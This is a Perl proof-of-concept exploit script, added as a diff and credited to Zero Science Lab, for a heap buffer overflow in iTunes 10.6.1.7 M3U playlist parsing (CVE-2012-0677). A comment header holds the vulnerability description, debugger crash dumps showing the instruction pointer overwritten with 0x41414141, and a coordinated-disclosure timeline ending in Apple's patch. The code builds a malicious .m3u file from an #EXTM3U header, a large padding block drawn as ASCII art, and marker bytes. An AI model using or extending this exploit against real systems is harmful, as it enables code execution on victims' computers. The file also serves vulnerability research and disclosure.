@@ -1,0 +1,198 @@
+#!/usr/bin/perl
+#
+#
+# Apple iTunes 10.6.1.7 M3U Playlist File Walking Heap Buffer Overflow
+#
+#
+# Vendor: Apple Inc.
+# Product web page: http://www.apple.com
+# Affected version: 10.6.1.7 and 10.6.0.40
+#
+# Summary: iTunes is a free application for your Mac or PC. It lets you
+# organize and play digital music and video on your computer. It can
+# automatically download new music, app, and book purchases across all
+# your devices and computers. And its a store that has everything you
+# need to be entertained. Anywhere. Anytime.
+#
+# Desc: The vulnerability is caused due to a boundary error in the processing
+# of a playlist file, which can be exploited to cause a heap based buffer
+# overflow when a user opens e.g. a specially crafted .M3U file. Successful
+# exploitation could allow execution of arbitrary code on the affected node.
+#
+#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#
+# (940.fc0): Access violation - code c0000005 (!!! second chance !!!)
+# eax=41414141 ebx=08508cd8 ecx=41414141 edx=052a6528 esi=052a64b0 edi=0559ef20
+# eip=41414141 esp=0012d8e8 ebp=7c90ff2d iopl=0         nv up ei pl nz na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+# <Unloaded_Card.dll>+0x41414130:
+# 41414141 ??              ???
+#
+# ~~~
+#
+# (6b0.a04): Access violation - code c0000005 (!!! second chance !!!)
+# eax=41414141 ebx=00000000 ecx=00000014 edx=41414141 esi=41414141 edi=0187e10d
+# eip=0187deec esp=0b0cfcd0 ebp=0b0cfcf0 iopl=0         nv up ei pl nz na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+# Defaulted to export symbols for C:\Program Files\Common Files\Apple\Apple Application Support\CoreFoundation.dll -
+# CoreFoundation!CFWriteStreamCreateWithAllocatedBuffers+0x40:
+# 0187deec 8b00            mov     eax,dword ptr [eax]  ds:0023:41414141=????????
+#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#
+#
+# Tested on: Microsoft Windows XP Professional SP3 EN (32bit)
+#            Microsoft Windows 7 Ultimate SP1 EN (64bit)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             Zero Science Lab - http://www.zeroscience.mk
+#
+#
+# Vendor status:
+#
+# [13.03.2012] Vulnerability discovered in version 10.6.0.40.
+# [29.03.2012] Vulnerability present in version 10.6.1.7.
+# [11.05.2012] Vendor contacted.
+# [11.05.2012] Vendor responds asking more details.
+# [11.05.2012] Sent detailed information and PoC code to the vendor.
+# [12.05.2012] Vendor begins investigation.
+# [14.05.2012] Asked vendor for confirmation.
+# [17.05.2012] Vendor confirms the vulnerability, developing patch.
+# [17.05.2012] Requested a scheduled patch release date from vendor.
+# [18.05.2012] Vendor replies.
+# [06.06.2012] Asked vendor for status update.
+# [08.06.2012] Vendor shares information about security update.
+# [11.06.2012] Vendor releases version 10.6.3 to address this issue.
+# [12.06.2012] Coordinated public security advisory released.
+#
+#
+# Advisory ID: ZSL-2012-5093
+# Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2012-5093.php
+# Advisory TXT: http://www.zeroscience.mk/codes/itunes_bof.txt
+#
+# Apple ID: APPLE-SA-2012-06-11-1
+# Apple Advisory #1: http://support.apple.com/kb/HT5318
+# Apple Advisory #2: http://support.apple.com/kb/HT1222
+#
+# CVE ID: CVE-2012-0677
+# CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-0677
+#
+#
+# 13.03.2012
+#
+
+use strict;
+
+my $FILE = "HIEROGLYPH.m3u";
+my $AN = "\x44\x44\x44\x44";
+my $EGYPTIAN = "\x43" x 16560;
+my $LIKE = "\x42\x42\x42\x42";
+
+
+
+
+
+
+                                                         #######
+                                                     #OOOOOOOOOOY
+                                                   my $WALK="\x23\x45".                       "\x58\x54\x4D\x33".
+                                                  "\x55\x0D\x41\x41\x41".                   "\x41\x41\x41".
+                                                "\x41\x41\x41\x41\x41\x41".                 "\x41\x41".
+                                              "\x41\x41\x41\x41".    "\x41".                "\x41\x41".
+                                             "\x41\x41\x41\x41\x41\x41\x41".                "\x41\x41".
+                                            "\x41\x41\x41\x41\x41\x41\x41\x41".            "\x41\x41".
+                                           "\x41\x41\x41\x41\x41\x41\x41\x41".             "\x41\x41".
+                                          "\x41\x41\x41\x41\x41\x41\x41\x41".              "\x41\x41".
+                                         "\x41\x41\x41\x41\x41\x41\x41\x41".               "\x41\x41".
+                                        "\x41\x41\x41\x41\x41\x41\x41\x41".                "\x41\x41".
+                                        "\x41\x41\x41\x41\x41\x41".    "\x41".            "\x41\x41".
+                                                    "\x41\x41\x41".      "\x41".          "\x41\x41".
+                       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                      "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                      "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                     "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                     "\x41\x41".           "\x41\x41\x41\x41\x41\x41\x41\x41".
+                     "\x41\x41".             "\x41\x41\x41\x41\x41\x41\x41".
+                    "\x41\x41".              "\x41\x41\x41\x41\x41\x41\x41".
+                    "\x41\x41".                "\x41\x41\x41\x41\x41\x41".
+                    "\x41\x41".                "\x41\x41\x41\x41\x41\x41".
+                    "\x41\x41".                  "\x41\x41\x41\x41\x41".
+                    "\x41\x41".                  "\x41\x41\x41\x41\x41".
+                   "\x41\x41".                   "\x41\x41\x41\x41\x41".
+                   "\x41\x41".                     "\x41\x41\x41\x41".
+               "\x41\x41\x41".                     "\x41\x41\x41\x41".
+         "\x41\x41\x41\x41".                       "\x41\x41\x41\x41".
+                                                     "\x41\x41\x41".
+                                                     "\x41\x41\x41".
+                                                     "\x41\x41\x41".
+                                                    "\x41\x41\x41\x41".
+                                                    "\x41\x41\x41\x41".
+                                                  "\x41\x41\x41\x41\x41".
+                                                  "\x41\x41\x41\x41\x41".
+                                                 "\x41\x41\x41\x41\x41\x41".
+                                               "\x41\x41\x41\x41\x41\x41\x41".
+                                               "\x41\x41\x41\x41\x41\x41\x41".
+                                              "\x41\x41\x41\x41\x41\x41\x41\x41".
+                                              "\x41\x41\x41\x41\x41\x41\x41\x41".
+                                             "\x41\x41\x41\x41\x41\x41\x41\x41".
+                                           "\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                                           "\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                                          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                                         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                                       "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                                     "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+                                    "\x41\x41\x41\x41\x41\x41\x41". "\x41\x41\x41".
+                                   "\x41\x41\x41\x41\x41\x41".        "\x41\x41\x41".
+                                  "\x41\x41\x41\x41\x41".               "\x41\x41\x41".
+                                        "\x41\x41\x41".                 "\x41\x41\x41".
+                                        "\x41\x41\x41".                  "\x41\x41\x41".
+                                       "\x41\x41\x41".                    "\x41\x41\x41".
+                                       "\x41\x41\x41".                    "\x41\x41\x41".
+                                        "\x41\x41".                          "\x41\x41".
+                                       "\x41\x41".                           "\x41\x41".
+                                       "\x41\x41".                           "\x41\x41".
+                                      "\x41\x41".                             "\x41\x41".
+                                      "\x41\x41".                              "\x41\x41".
+                                     "\x41\x41".                               "\x41\x41".
+                                    "\x41\x41".                                 "\x41\x41".
+                                   "\x41\x41".                                  "\x41\x41".
+                                  "\x41\x41".                                    "\x41\x41".
+                                 "\x41\x41".                                      "\x41\x41".
+                                "\x41\x41".                                       "\x41\x41".
+                               "\x41\x41".                                         "\x41\x41".
+                               "\x41\x41".                                          "\x41\x41".
+                              "\x41\x41".                                           "\x41\x41".
+                              "\x41\x41".                                            "\x41\x41".
+                             "\x41\x41\x41".                                        "\x41\x41\x41".
+                            "\x41\x41\x41\x41".                                     "\x41\x41\x41\x41".
+                            "\x41\x41\x41\x41\x41".                                 "\x41\x41\x41\x41\x41".
+                              "\x41\x41\x41\x41\x41\x41".                             "\x41\x41\x41\x41\x41\x41".
+          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+          "\x41\x41".                                                                                                 "\x41\x41".
+          "\x41\x41".                                                                                                 "\x41\x41".
+          "\x41\x41".                                                                                                 "\x41\x41".
+          "\x41\x41".                                                                                                 "\x41\x41".
+          "\x41\x41".                                                                                                 "\x41\x41".
+          "\x41\x41".                                                                                                 "\x41\x41".
+          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41". "\x41" x 7691;
+
+
+
+
+
+
+
+
+my $CRYPT = $WALK.$LIKE.$AN.$EGYPTIAN;
+print "\n\n[+] Creating $FILE file...\n";
+open ZSL, ">./$FILE" || die "\n[-] Can't open $FILE: $!\n\n";
+print ZSL $CRYPT;
+print "\n[+] File successfully composed!\n\n";
+close ZSL;
